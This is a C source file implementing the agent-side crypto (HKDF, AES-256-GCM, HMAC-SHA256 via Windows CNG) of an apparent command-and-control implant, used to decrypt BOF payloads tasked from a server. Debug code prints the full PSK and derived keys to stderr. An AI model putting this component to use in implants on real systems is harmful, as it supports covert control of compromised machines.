/*
 * bof_crypto.c - BOF Crypto for Agent Side
 *
 * Implements HKDF + AES-256-GCM + HMAC-SHA256 on Windows using CNG API.
 * Matches server-side bof_crypto.py exactly.
 *
 * Key Derivation:
 *   PRK = HMAC-SHA256(salt, PSK)
 *   OKM = HKDF-Expand(PRK, "newclientc2-v1-derivation", 128)
 *   traffic_key = OKM[0:32]
 *   sleep_key   = OKM[32:64]
 *   task_key    = OKM[64:96]
 *   mac_key     = OKM[96:128]
 *
 * Decrypt flow (for receiving BOF payload from server):
 *   1. Receive: [12B nonce][N bytes ciphertext+tag]
 *   2. AES-GCM decrypt with traffic_key → inner
 *   3. Split inner: hmac_recv = inner[:32], plaintext = inner[32:]
 *   4. Compute HMAC-SHA256(mac_key, plaintext)
 *   5. Constant-time compare hmac_recv == hmac_calc
 *   6. If match → return plaintext, else → reject
 *
 * Uses Windows CNG (BCrypt*) API — no external crypto library needed.
 */

#include "agent.h"
#include <bcrypt.h>

#ifndef BCRYPT_AES_ALGORITHM
#define BCRYPT_AES_ALGORITHM       L"AES"
#endif
#ifndef BCRYPT_CHAIN_MODE_GCM
#define BCRYPT_CHAIN_MODE_GCM      L"ChainingModeGCM"
#endif
#ifndef BCRYPT_SHA256_ALGORITHM
#define BCRYPT_SHA256_ALGORITHM    L"SHA256"
#endif
#ifndef BCRYPT_AUTH_TAG_LENGTH
#define BCRYPT_AUTH_TAG_LENGTH     L"AuthTagLength"
#endif

#pragma comment(lib, "bcrypt.lib")

/* Constants matching server-side */
#define CRYPTO_PSK_LEN      32
#define CRYPTO_SALT_LEN     32
#define CRYPTO_NONCE_LEN    12
#define CRYPTO_MAC_LEN      32
#define CRYPTO_KEY_LEN      32
#define CRYPTO_TAG_LEN      16  /* AES-GCM auth tag */
#define CRYPTO_INFO_LEN     29  /* "newclientc2-v1-derivation" + NUL */
#define CRYPTO_OKM_LEN      128

static const char CRYPTO_INFO[] = "newclientc2-v1-derivation";

/* Keys derived from PSK + salt */
typedef struct {
    uint8_t traffic_key[CRYPTO_KEY_LEN];
    uint8_t sleep_key[CRYPTO_KEY_LEN];
    uint8_t task_key[CRYPTO_KEY_LEN];
    uint8_t mac_key[CRYPTO_KEY_LEN];
} crypto_keys_t;

static crypto_keys_t g_crypto_keys;
static int g_crypto_initialized = 0;

/* Build-time PSK (placeholder — overridden by -DCRYPTO_PSK=\"...\" at build time) */
#ifndef CRYPTO_PSK_HEX
#define CRYPTO_PSK_HEX "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
#endif


/* ============================================================
 *  Hex string → bytes
 * ============================================================ */
static int hex_to_bytes(const char* hex, uint8_t* out, int out_len) {
    int len = (int)strlen(hex);
    if (len != out_len * 2) return -1;
    for (int i = 0; i < out_len; i++) {
        int hi, lo;
        char c = hex[i * 2];
        if (c >= '0' && c <= '9') hi = c - '0';
        else if (c >= 'a' && c <= 'f') hi = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') hi = c - 'A' + 10;
        else return -1;

        c = hex[i * 2 + 1];
        if (c >= '0' && c <= '9') lo = c - '0';
        else if (c >= 'a' && c <= 'f') lo = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') lo = c - 'A' + 10;
        else return -1;

        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return 0;
}


/* ============================================================
 *  HMAC-SHA256 (using CNG)
 * ============================================================ */
static int hmac_sha256(const uint8_t* key, int key_len,
                       const uint8_t* msg, int msg_len,
                       uint8_t* out) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    int rc = -1;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM,
                                          NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (status != 0) return -1;

    status = BCryptCreateHash(hAlg, &hHash, NULL, 0,
                               (PUCHAR)key, key_len, 0);
    if (status != 0) goto cleanup;

    if (msg_len > 0) {
        status = BCryptHashData(hHash, (PUCHAR)msg, msg_len, 0);
        if (status != 0) goto cleanup;
    }

    status = BCryptFinishHash(hHash, out, 32, 0);
    if (status == 0) rc = 0;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}


/* ============================================================
 *  HKDF-Extract: PRK = HMAC-SHA256(salt, IKM)
 * ============================================================ */
static int hkdf_extract(const uint8_t* salt, int salt_len,
                        const uint8_t* ikm, int ikm_len,
                        uint8_t* prk) {
    return hmac_sha256(salt, salt_len, ikm, ikm_len, prk);
}


/* ============================================================
 *  HKDF-Expand: T(1) || T(2) || ... until length bytes
 * ============================================================ */
static int hkdf_expand(const uint8_t* prk, int prk_len,
                       const uint8_t* info, int info_len,
                       uint8_t* okm, int okm_len) {
    uint8_t t[32];
    int t_len = 0;
    int pos = 0;
    uint8_t counter = 1;

    while (pos < okm_len) {
        /* Build input: T(n-1) | info | counter */
        uint8_t input[32 + 64 + 1];
        int input_len = 0;

        if (t_len > 0) {
            memcpy(input, t, t_len);
            input_len = t_len;
        }

        if (info_len > 0) {
            memcpy(input + input_len, info, info_len);
            input_len += info_len;
        }

        input[input_len++] = counter;

        if (hmac_sha256(prk, prk_len, input, input_len, t) != 0) {
            return -1;
        }
        t_len = 32;

        int copy_len = (okm_len - pos < 32) ? (okm_len - pos) : 32;
        memcpy(okm + pos, t, copy_len);
        pos += copy_len;
        counter++;
    }

    return 0;
}


/* ============================================================
 *  Derive all 4 keys from PSK + salt
 * ============================================================ */
int crypto_derive_keys(const uint8_t* psk, int psk_len,
                        const uint8_t* salt, int salt_len,
                        crypto_keys_t* keys) {
    uint8_t prk[32];
    uint8_t okm[CRYPTO_OKM_LEN];

    if (psk_len != 32 || salt_len != 32) return -1;

    if (hkdf_extract(salt, salt_len, psk, psk_len, prk) != 0) {
        return -1;
    }

    if (hkdf_expand(prk, 32, (const uint8_t*)CRYPTO_INFO,
                     (int)strlen(CRYPTO_INFO), okm, CRYPTO_OKM_LEN) != 0) {
        return -1;
    }

    memcpy(keys->traffic_key, okm + 0, 32);
    memcpy(keys->sleep_key,   okm + 32, 32);
    memcpy(keys->task_key,    okm + 64, 32);
    memcpy(keys->mac_key,     okm + 96, 32);

    /* Zero intermediates */
    memset(prk, 0, sizeof(prk));
    memset(okm, 0, sizeof(okm));

    return 0;
}


/* ============================================================
 *  AES-256-GCM Decrypt
 * ============================================================ */
int crypto_aes_gcm_decrypt(const uint8_t* key, int key_len,
                            const uint8_t* nonce, int nonce_len,
                            const uint8_t* ciphertext, int ciphertext_len,
                            const uint8_t* tag, int tag_len,
                            uint8_t* plaintext_out) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    int rc = -1;
    uint8_t* key_obj_buf = NULL;
    DWORD key_obj_len = 0;

    if (key_len != 32 || nonce_len != 12 || tag_len != 16) {
        return -1;
    }

    /* Open AES algorithm provider */
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return -1;

    /* Set GCM chaining mode */
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                                (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) goto cleanup;

    /* Get key object length
     * CRITICAL BUG FIX: pcbResult must be a DIFFERENT variable from pbOutput!
     * Old code had both pointing to &key_obj_len, causing:
     *   1. BCryptGetProperty writes property value (e.g., 656) to &key_obj_len
     *   2. Then writes bytes-copied (4) to &key_obj_len, OVERWRITING it
     *   3. key_obj_len becomes 4 instead of 656
     *   4. malloc(4) allocates tiny buffer
     *   5. BCryptGenerateSymmetricKey overflows buffer → corrupt key → decrypt fails
     */
    DWORD copied = 0;
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                                (PUCHAR)&key_obj_len, sizeof(key_obj_len),
                                &copied, 0);
    if (status != 0) goto cleanup;

    fprintf(stderr, "[DBG] Key object length: %lu bytes\n",
            (unsigned long)key_obj_len);
    fflush(stderr);

    key_obj_buf = (uint8_t*)malloc(key_obj_len);
    if (!key_obj_buf) goto cleanup;

    /* Generate symmetric key */
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, key_obj_buf, key_obj_len,
                                          (PUCHAR)key, key_len, 0);
    if (status != 0) goto cleanup;

    /* Set up GCM auth info — CRITICAL: must zero the ENTIRE structure first!
     * The BCRYPT_INIT_AUTH_MODE_INFO macro in MinGW/Zig headers only sets
     * cbSize and dwInfoVersion, but does NOT zero the other fields.
     * Stack garbage in pbAuthData/cbAuthData/pbMacContext etc. causes
     * BCryptDecrypt to fail with STATUS_AUTH_TAG_MISMATCH. */
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
    memset(&auth_info, 0, sizeof(auth_info));
    auth_info.cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
    auth_info.dwInfoVersion = 1;
    auth_info.pbNonce = (PUCHAR)nonce;
    auth_info.cbNonce = nonce_len;
    auth_info.pbTag = (PUCHAR)tag;
    auth_info.cbTag = tag_len;

    /* Decrypt */
    DWORD plaintext_len = 0;
    /* CRITICAL: BCryptDecrypt with GCM expects:
     *   - pbInput  = ciphertext ONLY (NOT including tag)
     *   - cbInput  = ciphertext length (NOT including tag)
     *   - pbOutput = buffer for plaintext (same size as ciphertext)
     *   - cbOutput = ciphertext length (NOT including tag)
     *   - auth_info.pbTag = tag (separately)
     *   - auth_info.cbTag = 16
     *
     * If we pass ct_plus_tag (which has tag appended) as pbInput,
     * BCryptDecrypt may try to decrypt the tag bytes as ciphertext,
     * resulting in wrong plaintext → wrong auth tag computation → failure.
     */
    status = BCryptDecrypt(hKey,
                            (PUCHAR)ciphertext,    /* ciphertext only (no tag) */
                            ciphertext_len,        /* ciphertext length (no tag) */
                            &auth_info,
                            NULL, 0,                /* no IV (GCM uses nonce) */
                            plaintext_out,         /* output buffer */
                            ciphertext_len,        /* output buffer size = ciphertext len */
                            &plaintext_len,
                            0);

    if (status != 0) {
        fprintf(stderr, "[X] BCryptDecrypt failed: status=0x%08lX\n",
                (unsigned long)status);
        if (status == 0xC000A002) {
            fprintf(stderr, "    (STATUS_AUTH_TAG_MISMATCH - tag verification failed)\n");
        }
    }

    if (status == 0) {
        rc = (int)plaintext_len;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (key_obj_buf) free(key_obj_buf);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}


/* ============================================================
 *  Decrypt BOF payload (full flow: GCM + HMAC verify)
 *
 *  wire format: [12B nonce][N bytes ciphertext+16B tag]
 *  inner format: [32B HMAC][plaintext]
 * ============================================================ */
static int crypto_decrypt_payload(const uint8_t* wire, int wire_len,
                                    uint8_t* plaintext_out, int plaintext_cap,
                                    const crypto_keys_t* keys) {
    fprintf(stderr, "[DBG] decrypt_payload: wire_len=%d, plaintext_cap=%d\n",
            wire_len, plaintext_cap);
    fflush(stderr);

    if (wire_len < CRYPTO_NONCE_LEN + CRYPTO_TAG_LEN + CRYPTO_MAC_LEN) {
        fprintf(stderr, "[X] Wire too short: %d < %d\n",
                wire_len, CRYPTO_NONCE_LEN + CRYPTO_TAG_LEN + CRYPTO_MAC_LEN);
        return -1;
    }

    /* Extract nonce and ciphertext+tag */
    const uint8_t* nonce = wire;
    int ct_plus_tag_len = wire_len - CRYPTO_NONCE_LEN;
    const uint8_t* ct_plus_tag = wire + CRYPTO_NONCE_LEN;

    /* ciphertext is everything except last 16 bytes (tag) */
    int ct_len = ct_plus_tag_len - CRYPTO_TAG_LEN;
    const uint8_t* tag = ct_plus_tag + ct_len;

    fprintf(stderr, "[DBG] Nonce (%d bytes): ", CRYPTO_NONCE_LEN);
    for (int i = 0; i < CRYPTO_NONCE_LEN; i++) fprintf(stderr, "%02x", nonce[i]);
    fprintf(stderr, "\n");
    fprintf(stderr, "[DBG] ct_len=%d, tag at offset %d\n", ct_len, ct_len);
    fflush(stderr);

    if (ct_len < CRYPTO_MAC_LEN) {
        fprintf(stderr, "[X] ct_len too short for HMAC\n");
        return -1;
    }

    /* Decrypt: AES-256-GCM */
    uint8_t* inner = (uint8_t*)malloc(ct_len);
    if (!inner) return -1;

    fprintf(stderr, "[DBG] Calling AES-GCM decrypt (ct_len=%d)...\n", ct_len);
    fflush(stderr);

    /* CRITICAL: BCryptDecrypt with GCM expects:
     *   - pbInput  = ciphertext ONLY (without tag)
     *   - cbInput  = ciphertext length (without tag)
     *   - auth_info.pbTag = tag (set separately)
     *
     * Bug was: passing ct_plus_tag (which includes tag) as input buffer,
     * with ct_len (without tag) as length. This caused BCryptDecrypt to
     * compute wrong auth tag → STATUS_AUTH_TAG_MISMATCH.
     *
     * Fix: pass only ciphertext (first ct_len bytes of ct_plus_tag) */
    int inner_len = crypto_aes_gcm_decrypt(
        keys->traffic_key, 32,
        nonce, CRYPTO_NONCE_LEN,
        ct_plus_tag,         /* buffer start */
        ct_len,              /* length = ciphertext only (NO tag) */
        tag, CRYPTO_TAG_LEN,
        inner);

    if (inner_len < 0) {
        fprintf(stderr, "[X] AES-GCM decrypt failed (auth tag mismatch)\n");
        fprintf(stderr, "[DBG] This means either:\n");
        fprintf(stderr, "     - Wrong traffic_key (PSK/salt mismatch)\n");
        fprintf(stderr, "     - Ciphertext corrupted\n");
        fprintf(stderr, "[DBG] traffic_key used: ");
        for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", keys->traffic_key[i]);
        fprintf(stderr, "...\n");
        free(inner);
        return -1;
    }

    fprintf(stderr, "[DBG] AES-GCM decrypt OK, inner_len=%d\n", inner_len);
    fflush(stderr);

    /* Verify HMAC: first 32 bytes = HMAC, rest = plaintext */
    if (inner_len < CRYPTO_MAC_LEN) {
        fprintf(stderr, "[X] Inner too short for HMAC\n");
        free(inner);
        return -1;
    }

    const uint8_t* hmac_recv = inner;
    int plaintext_len = inner_len - CRYPTO_MAC_LEN;
    const uint8_t* plaintext = inner + CRYPTO_MAC_LEN;

    uint8_t hmac_calc[CRYPTO_MAC_LEN];
    if (hmac_sha256(keys->mac_key, 32, plaintext, plaintext_len, hmac_calc) != 0) {
        fprintf(stderr, "[X] HMAC calculation failed\n");
        free(inner);
        return -1;
    }

    fprintf(stderr, "[DBG] HMAC received: ");
    for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", hmac_recv[i]);
    fprintf(stderr, "...\n");
    fprintf(stderr, "[DBG] HMAC computed: ");
    for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", hmac_calc[i]);
    fprintf(stderr, "...\n");
    fflush(stderr);

    /* Constant-time compare */
    int diff = 0;
    for (int i = 0; i < CRYPTO_MAC_LEN; i++) {
        diff |= hmac_recv[i] ^ hmac_calc[i];
    }

    if (diff != 0) {
        fprintf(stderr, "[X] HMAC mismatch (diff=0x%02x)\n", diff);
        fprintf(stderr, "[DBG] mac_key used: ");
        for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", keys->mac_key[i]);
        fprintf(stderr, "...\n");
        free(inner);
        return -1;
    }

    fprintf(stderr, "[DBG] HMAC verified OK\n");

    /* Copy plaintext to output */
    if (plaintext_len > plaintext_cap) {
        fprintf(stderr, "[X] Plaintext too large: %d > %d\n",
                plaintext_len, plaintext_cap);
        free(inner);
        return -1;
    }

    memcpy(plaintext_out, plaintext, plaintext_len);

    /* Wipe sensitive data */
    memset(inner, 0, ct_len);
    memset(hmac_calc, 0, CRYPTO_MAC_LEN);
    free(inner);

    fprintf(stderr, "[DBG] Decrypt complete, returning %d bytes\n", plaintext_len);
    fflush(stderr);

    return plaintext_len;
}


/* ============================================================
 *  Public: Decrypt BOF payload
 * ============================================================ */
int crypto_decrypt_bof_payload(const uint8_t* wire, int wire_len,
                                uint8_t* plaintext_out, int plaintext_cap) {
    if (!g_crypto_initialized) return -1;
    return crypto_decrypt_payload(wire, wire_len, plaintext_out, plaintext_cap,
                                    &g_crypto_keys);
}


/* ============================================================
 *  Initialize crypto with PSK (from build-time) + salt
 * ============================================================ */
int crypto_init(const uint8_t* salt, int salt_len) {
    uint8_t psk[32];

    /* Decode PSK from hex string (build-time constant) */
    if (hex_to_bytes(CRYPTO_PSK_HEX, psk, 32) != 0) {
        fprintf(stderr, "[X] Failed to decode PSK from hex\n");
        return -1;
    }

    /* DEBUG: Print PSK and salt (first 8 bytes only for security) */
    fprintf(stderr, "[DBG] PSK (first 8 bytes): ");
    for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", psk[i]);
    fprintf(stderr, "\n");
    fprintf(stderr, "[DBG] PSK full hex: %s\n", CRYPTO_PSK_HEX);
    fprintf(stderr, "[DBG] Salt (first 8 bytes): ");
    for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", salt[i]);
    fprintf(stderr, "\n");
    fprintf(stderr, "[DBG] Salt full (32 bytes): ");
    for (int i = 0; i < 32; i++) fprintf(stderr, "%02x", salt[i]);
    fprintf(stderr, "\n");
    fflush(stderr);

    if (crypto_derive_keys(psk, 32, salt, salt_len, &g_crypto_keys) != 0) {
        fprintf(stderr, "[X] Key derivation failed\n");
        memset(psk, 0, sizeof(psk));
        return -1;
    }

    /* DEBUG: Print derived keys */
    fprintf(stderr, "[DBG] Derived traffic_key: ");
    for (int i = 0; i < 32; i++) fprintf(stderr, "%02x", g_crypto_keys.traffic_key[i]);
    fprintf(stderr, "\n");
    fprintf(stderr, "[DBG] Derived mac_key: ");
    for (int i = 0; i < 32; i++) fprintf(stderr, "%02x", g_crypto_keys.mac_key[i]);
    fprintf(stderr, "\n");
    fflush(stderr);

    g_crypto_initialized = 1;
    memset(psk, 0, sizeof(psk));  /* wipe PSK from stack */
    return 0;
}


/* ============================================================
 *  Get derived keys (returns NULL if not initialized)
 * ============================================================ */
const crypto_keys_t* crypto_get_keys(void) {
    if (!g_crypto_initialized) return NULL;
    return &g_crypto_keys;
}


/* ============================================================
 *  Cleanup crypto (wipe keys from memory)
 * ============================================================ */
void crypto_cleanup(void) {
    memset(&g_crypto_keys, 0, sizeof(g_crypto_keys));
    g_crypto_initialized = 0;
}
